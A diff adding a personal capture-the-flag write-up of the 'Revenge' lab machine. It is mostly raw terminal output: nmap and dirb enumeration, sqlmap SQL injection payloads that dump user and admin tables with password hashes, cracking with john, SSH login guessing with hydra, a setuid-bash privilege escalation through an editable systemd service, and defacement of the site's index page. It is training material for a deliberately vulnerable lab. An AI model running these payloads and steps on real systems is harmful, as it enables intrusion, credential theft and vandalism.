@@ -1,0 +1,535 @@
+/etc/hosts file
+
+127.0.0.1       kubernetes.docker.internal
+10.10.129.144   revenge.thm
+
+
+Domain:revenge.thm
+
+Nmap scan results:
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 12:08 IST
+Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 0.00% done
+Nmap scan report for revenge.thm (10.10.129.144)
+Host is up (0.16s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
+|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
+|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Home | Rubber Ducky Inc.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/4%OT=22%CT=1%CU=39368%PV=Y%DS=2%DC=T%G=Y%TM=5FA24C8
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
+OS:1NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+
+MIght be users on the machine
+vishas
+shrinu
+amanda
+cummings
+johnny
+young
+karen
+lee
+
+domain = websupport@rubberduckyinc.org
+
+Dirb scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://revenge.thm
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov  4 12:11:21 2020
+URL_BASE: http://revenge.thm/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://revenge.thm/ ----
++ http://revenge.thm/admin (CODE:200|SIZE:4983)
++ http://revenge.thm/contact (CODE:200|SIZE:6906)
++ http://revenge.thm/index (CODE:200|SIZE:8541)
++ http://revenge.thm/login (CODE:200|SIZE:4980)
++ http://revenge.thm/products (CODE:200|SIZE:7254)
+==> DIRECTORY: http://revenge.thm/static/
+
+I did enumerate for a bit and found out a login page.
+But we dont have any credentials so we can just try to see if there's sql injection.
+
+No results.
+
+One thing striked me that we can try to see if the products page have sqli vuln.
+As most of times, the sqli gets exploited a lot over there.
+
+
+root@LAPTOP-U5913CMD:/home/akshay# sqlmap -u http://revenge.thm/products/3
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.4.9#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:20:41 /2020-11-04/
+
+[12:20:41] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'                         
+do you want to try URI injections in the target URL itself? [Y/n/q] y
+[12:20:43] [INFO] testing connection to the target URL
+[12:20:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:20:44] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+are you sure that you want to continue with further target testing? [Y/n] y
+[12:20:50] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[12:20:50] [INFO] testing if the target URL content is stable
+[12:20:50] [INFO] target URL content is stable
+[12:20:50] [INFO] testing if URI parameter '#1*' is dynamic
+[12:20:51] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[12:20:51] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[12:20:51] [INFO] testing for SQL injection on URI parameter '#1*'
+[12:20:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:20:53] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
+[12:20:57] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+
+current UNION query injection technique test
+[12:21:30] [INFO] target URL appears to have 8 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[12:21:57] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 118 HTTP(s) requests:
+
+
+Wow cool it is injectable now lets try to exploit it.
+
+do you want to try URI injections in the target URL itself? [Y/n/q] y
+[12:22:13] [INFO] resuming back-end DBMS 'mysql'
+[12:22:13] [INFO] testing connection to the target URL
+[12:22:14] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://revenge.thm:80/products/3 AND 2550=2550
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://revenge.thm:80/products/3 AND (SELECT 8024 FROM (SELECT(SLEEP(5)))WWxo)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: http://revenge.thm:80/products/-3882 UNION ALL SELECT 14,14,14,14,CONCAT(0x7176767671,0x67714766574b4c714c7544465263766b587445794b4c74536d59764d517162597543534d59646766,0x716b6b7a71),14,14,14-- -
+---
+[12:22:14] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[12:22:14] [INFO] fetching database names
+[12:22:14] [INFO] retrieved: 'information_schema'
+[12:22:15] [INFO] retrieved: 'duckyinc'
+[12:22:15] [INFO] retrieved: 'mysql'
+[12:22:15] [INFO] retrieved: 'performance_schema'
+[12:22:15] [INFO] retrieved: 'sys'
+available databases [5]:
+[*] duckyinc
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+
+[12:22:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/revenge.thm'
+
+[*] ending @ 12:22:16 /2020-11-04/
+
+
+root@LAPTOP-U5913CMD:/home/akshay# sqlmap -u http://revenge.thm/products/3 -D "duckyinc" --tables
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.9#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:29:27 /2020-11-04/
+
+[12:29:27] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'                         
+do you want to try URI injections in the target URL itself? [Y/n/q] y
+[12:29:28] [INFO] resuming back-end DBMS 'mysql'
+[12:29:28] [INFO] testing connection to the target URL
+[12:29:29] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://revenge.thm:80/products/3 AND 2550=2550
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://revenge.thm:80/products/3 AND (SELECT 8024 FROM (SELECT(SLEEP(5)))WWxo)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: http://revenge.thm:80/products/-3882 UNION ALL SELECT 14,14,14,14,CONCAT(0x7176767671,0x67714766574b4c714c7544465263766b587445794b4c74536d59764d517162597543534d59646766,0x716b6b7a71),14,14,14-- -
+---
+[12:29:29] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[12:29:29] [INFO] fetching tables for database: 'duckyinc'
+[12:29:29] [INFO] retrieved: 'product'
+[12:29:30] [INFO] retrieved: 'system_user'
+[12:29:30] [INFO] retrieved: 'user'
+Database: duckyinc
+[3 tables]
++-------------+
+| system_user |
+| user        |
+| product     |
++-------------+
+
+[12:29:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/revenge.thm'
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay# sqlmap -u http://revenge.thm/products/3 -D "duckyinc" -T "user" --dump
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.9#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:29:40 /2020-11-04/
+
+[12:29:40] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'                         
+do you want to try URI injections in the target URL itself? [Y/n/q] y
+[12:29:42] [INFO] resuming back-end DBMS 'mysql'
+[12:29:42] [INFO] testing connection to the target URL
+[12:29:42] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://revenge.thm:80/products/3 AND 2550=2550
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://revenge.thm:80/products/3 AND (SELECT 8024 FROM (SELECT(SLEEP(5)))WWxo)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: http://revenge.thm:80/products/-3882 UNION ALL SELECT 14,14,14,14,CONCAT(0x7176767671,0x67714766574b4c714c7544465263766b587445794b4c74536d59764d517162597543534d59646766,0x716b6b7a71),14,14,14-- -
+---
+[12:29:42] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[12:29:42] [INFO] fetching columns for table 'user' in database 'duckyinc'
+[12:29:43] [INFO] retrieved: 'id','int(11)'
+[12:29:43] [INFO] retrieved: 'username','varchar(64)'
+[12:29:43] [INFO] retrieved: '_password','varchar(128)'
+[12:29:43] [INFO] retrieved: 'credit_card','varchar(26)'
+[12:29:44] [INFO] retrieved: 'email','varchar(120)'
+[12:29:44] [INFO] retrieved: 'company','varchar(50)'
+[12:29:44] [INFO] fetching entries for table 'user' in database 'duckyinc'
+[12:29:45] [INFO] retrieved: '$2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa','Fake Inc','4338736490565706','sales@fakeinc.org','1','jhenry'
+[12:29:45] [INFO] retrieved: '$2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm','Evil Corp','355219744086163','accountspayable@ecorp.org','2','smonroe'
+[12:29:45] [INFO] retrieved: '$2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C','McDoonalds Inc','349789518019219','accounts.payable@mcdoonalds.org','3','dross'
+[12:29:45] [INFO] retrieved: '$2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO','ABC Corp','4499108649937274','sales@ABC.com','4','ngross'
+[12:29:45] [INFO] retrieved: '$2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu','Three Below','4563593127115348','sales@threebelow.com','5','jlawlor'
+[12:29:45] [INFO] retrieved: '$2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC','Krasco Org','thm{#################}','ap@krasco.org','6','mandrews'
+[12:29:46] [INFO] retrieved: '$2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm','Wally World Corp','4905698211632780','payable@wallyworld.com','7','dgorman'
+[12:29:46] [INFO] retrieved: '$2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS','Orlando City','4690248976187759','payables@orlando.gov','8','mbutts'
+[12:29:46] [INFO] retrieved: '$2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem','Dolla Twee','375019041714434','sales@dollatwee.com','9','hmontana'
+[12:29:46] [INFO] retrieved: '$2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36','O!  Fam Dollar','364774395134471','sales@ofamdollar','10','csmith'
+Database: duckyinc
+Table: user
+[10 entries]
++----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+| id | email                           | company          | username | _password                                                    | credit_card                |
++----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
+| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
+| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
+| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
+| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
+| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{################} |
+| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
+| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
+| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
+| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
++----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+
+[12:29:46] [INFO] table 'duckyinc.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/revenge.thm/dump/duckyinc/user.csv'
+[12:29:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/revenge.thm'
+
+
+Here's our first flag.
+Nice
+
+Flag 1: thm{###################}
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Revenge# john hashes --wordlist=/home/akshay/Downloads/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 10 password hashes with 10 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:03:08 0.00% (ETA: 2020-12-26 08:18) 0g/s 3.442p/s 34.42c/s 34.42C/s gloria..scorpion
+peace            (?)
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WebCrawler# sqlmap -u http://revenge.thm/products/3 -D "duckyinc" -T "system_user" --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.4.9#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:50:17 /2020-11-04/
+
+[13:50:17] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'                         
+do you want to try URI injections in the target URL itself? [Y/n/q] y
+[13:50:18] [INFO] resuming back-end DBMS 'mysql'
+[13:50:18] [INFO] testing connection to the target URL
+[13:50:19] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://revenge.thm:80/products/3 AND 2550=2550
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://revenge.thm:80/products/3 AND (SELECT 8024 FROM (SELECT(SLEEP(5)))WWxo)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: http://revenge.thm:80/products/-3882 UNION ALL SELECT 14,14,14,14,CONCAT(0x7176767671,0x67714766574b4c714c7544465263766b587445794b4c74536d59764d517162597543534d59646766,0x716b6b7a71),14,14,14-- -
+---
+[13:50:19] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[13:50:19] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
+[13:50:19] [INFO] retrieved: 'id','int(11)'
+[13:50:20] [INFO] retrieved: 'username','varchar(64)'
+[13:50:20] [INFO] retrieved: '_password','varchar(128)'
+[13:50:20] [INFO] retrieved: 'email','varchar(120)'
+[13:50:20] [INFO] fetching entries for table 'system_user' in database 'duckyinc'
+[13:50:21] [INFO] retrieved: '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a','sadmin@duckyinc.org','1','server-admin'
+[13:50:21] [INFO] retrieved: '$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa','kmotley@duckyinc.org','2','kmotley'
+[13:50:21] [INFO] retrieved: '$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK','dhughes@duckyinc.org','3','dhughes'
+Database: duckyinc
+Table: system_user
+[3 entries]
++----+----------------------+--------------+--------------------------------------------------------------+
+| id | email                | username     | _password                                                    |
++----+----------------------+--------------+--------------------------------------------------------------+
+| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
+| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
+| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
++----+----------------------+--------------+--------------------------------------------------------------+
+
+[13:50:21] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/root/.local/share/sqlmap/output/revenge.thm/dump/duckyinc/system_user.csv'
+[13:50:21] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/revenge.thm'
+
+[*] ending @ 13:50:21 /2020-11-04/
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/WebCrawler#
+
+
+root@LAPTOP-U5913CMD:/opt/knock/knockpy# cd /home/akshay/Desktop/Revenge/
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Revenge# nano admin
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Revenge# john admin --wordlist=/home/akshay/Downloads/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
+Loaded hashes with cost 1 (iteration count) varying from 256 to 4096
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+inu#######        (?)
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Revenge# hydra -L admin.txt -p inuyasha ssh://revenge.thm
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-04 13:53:25
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
+[DATA] attacking ssh://revenge.thm:22/
+[22][ssh] host: revenge.thm   login: server-admin   password: inuyasha
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-04 13:53:30
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Revenge#
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Revenge# ssh server-admin@revenge.thm
+The authenticity of host 'revenge.thm (10.10.20.139)' can't be established.
+ECDSA key fingerprint is SHA256:p6l0aKeIJlyHmiqZxt/pRvjb++LAjF9jTDp4ZkSCpOk.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'revenge.thm,10.10.20.139' (ECDSA) to the list of known hosts.
+server-admin@revenge.thm's password:
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+8 packages can be updated.
+0 updates are security updates.
+
+
+################################################################################
+#                        Ducky Inc. Web Server 00080012                        #
+#            This server is for authorized Ducky Inc. employees only           #
+#                  All actiions are being monitored and recorded               #
+#                    IP and MAC addresses have been logged                     #
+################################################################################
+Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
+server-admin@duckyinc:~$ id
+uid=1001(server-admin) gid=1001(server-admin) groups=1001(server-admin),33(www-data)
+server-admin@duckyinc:~$
+
+
+server-admin@duckyinc:~$ sudo -l
+[sudo] password for server-admin:
+Matching Defaults entries for server-admin on duckyinc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User server-admin may run the following commands on duckyinc:
+    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
+        /etc/systemd/system/duckyinc.service
+server-admin@duckyinc:~$
+
+
+seems we can edit /etc/systemd/system/duckyinc.service
+
+Lets edit and restart the service.
+
+[Unit]
+Description=Gunicorn instance to serve DuckyInc Webapp
+After=network.target
+
+[Service]
+User=root
+Group=root
+WorkingDirectory=/var/www/duckyinc
+ExecStart=/bin/bash /home/server-admin/root.sh
+ExecReload=/bin/kill -s HUP $MAINPID
+ExecStop=/bin/kill -s TERM $MAINPID
+
+[Install]
+WantedBy=multi-user.target
+
+
+Now go to /home/server-admin/ and write malicious script into root.sh
+
+server-admin@duckyinc:~$ nano root.sh
+server-admin@duckyinc:~$ cat root.sh
+#!/bin/bash
+
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+
+server-admin@duckyinc:~$ chmod +x root.sh
+server-admin@duckyinc:~$
+
+server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
+server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
+server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
+
+
+server-admin@duckyinc:/tmp$ cd /tmp
+server-admin@duckyinc:/tmp$ ls -la
+total 1124
+drwxrwxrwt  9 root root    4096 Nov  4 10:50 .
+drwxr-xr-x 24 root root    4096 Aug  9 15:17 ..
+-rwsr-sr-x  1 root root 1113504 Nov  4 10:50 bash
+drwxrwxrwt  2 root root    4096 Nov  4 10:41 .font-unix
+drwxrwxrwt  2 root root    4096 Nov  4 10:41 .ICE-unix
+drwx------  3 root root    4096 Nov  4 10:41 systemd-private-2a7d258c024d4893b88400afec9b5b46-systemd-resolved.service-VZi6rK
+drwx------  3 root root    4096 Nov  4 10:41 systemd-private-2a7d258c024d4893b88400afec9b5b46-systemd-timesyncd.service-WbFuPH
+drwxrwxrwt  2 root root    4096 Nov  4 10:41 .Test-unix
+drwxrwxrwt  2 root root    4096 Nov  4 10:41 .X11-unix
+drwxrwxrwt  2 root root    4096 Nov  4 10:41 .XIM-unix
+server-admin@duckyinc:/tmp$
+
+
+server-admin@duckyinc:/tmp$ ./bash -p
+bash-4.4# id
+uid=1001(server-admin) gid=1001(server-admin) euid=0(root) egid=0(root) groups=0(root),33(www-data),1001(server-admin)
+bash-4.4# cd /root
+bash-4.4# ls
+bash-4.4# ls -la
+total 52
+drwx------  7 root root 4096 Aug 28 03:10 .
+drwxr-xr-x 24 root root 4096 Aug  9 15:17 ..
+drwxr-xr-x  2 root root 4096 Aug 12 18:46 .bash_completion.d
+lrwxrwxrwx  1 root root    9 Aug 10 12:54 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3227 Aug 12 18:46 .bashrc
+drwx------  3 root root 4096 Aug  9 16:15 .cache
+drwx------  3 root root 4096 Aug  9 15:31 .gnupg
+drwxr-xr-x  5 root root 4096 Aug 12 18:44 .local
+-rw-------  1 root root  485 Aug 10 00:44 .mysql_history
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Aug 10 13:21 .selected_editor
+drwx------  2 root root 4096 Aug  9 15:29 .ssh
+-rw-------  1 root root 7763 Aug 12 18:57 .viminfo
+bash-4.4#
+
+
+At first you wont be seeing any flag as we havent defaced the index page.
+So lets do that.
+
+bash-4.4# cd /var/www
+bash-4.4# ls
+duckyinc
+bash-4.4# cd duckyinc/
+bash-4.4# ls
+app.py  __pycache__  requirements.txt  static  templates
+bash-4.4# cd templates/
+bash-4.4# ls
+404.html  500.html  admin.html  base.html  contact.html  index.html  login.html  product.html  products.html
+bash-4.4# nano index.html
+bash-4.4#
+
+       <h2 class="center"><i class="material-icons deep-orange-text text-darken-1">favorite</i></h2>
+          <h5 class="center">The company you cant trust as it got hacked by Voker2311</h5>
+
+
+Hahah
+
+
+bash-4.4# cat flag3.txt
+thm{m1s#################d}
+bash-4.4#
